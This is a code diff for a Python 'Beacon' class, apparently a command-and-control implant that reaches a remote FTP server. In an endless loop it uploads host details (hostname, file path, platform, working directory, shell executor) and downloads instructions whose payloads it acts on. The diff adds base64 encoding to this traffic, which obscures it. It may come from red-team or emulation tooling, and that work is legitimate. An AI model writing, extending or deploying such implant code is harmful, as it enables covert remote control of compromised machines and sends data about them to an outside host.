@@ -41,28 +41,24 @@ class Beacon:
         self.ftp.login(user, password)
         self.ftp.set_pasv(False)
         self.jitter = jitter
-        self.beacon = self._build_beacon()
-        self.target = None
+        self.target = host
         self.links = []
 
     def monitor(self):
-        def handle(res):
-            self.target = res
-            while True:
-                self.stor()
-                self.retr()
-                time.sleep(self.jitter)
-        self.ftp.retrlines('RETR target.txt', handle)
+        while True:
+            self.stor()
+            self.retr()
+            time.sleep(self.jitter)
 
     def stor(self):
-        payload = json.dumps(dict(Links=self.links, Target=self.target, **self.beacon))
+        payload = base64.urlsafe_b64encode(json.dumps(self._build_beacon(self.target, self.links)))
         self.ftp.storlines('STOR %s.json' % socket.gethostname(), io.BytesIO(payload.encode()))
         self.links = []
 
     def retr(self):
         def handle(res):
-            if len(res):
-                instructions = json.loads(res)
+            if res:
+                instructions = json.loads(base64.b64decode(res))
                 for i in instructions['links']:
                     try:
                         if i['Payload']:
@@ -74,14 +70,16 @@ class Beacon:
         self.ftp.retrlines('RETR %s.json' % socket.gethostname(), handle)
 
     @staticmethod
-    def _build_beacon():
+    def _build_beacon(target, links=[]):
         return dict(
             Name=socket.gethostname(),
             Location=__file__,
             Platform=sys.platform,
             Executors=['sh'],
             Range='dynamic',
-            Pwd=os.getcwd()
+            Pwd=os.getcwd(),
+            Target=target,
+            Links=links
         )
 
     @staticmethod
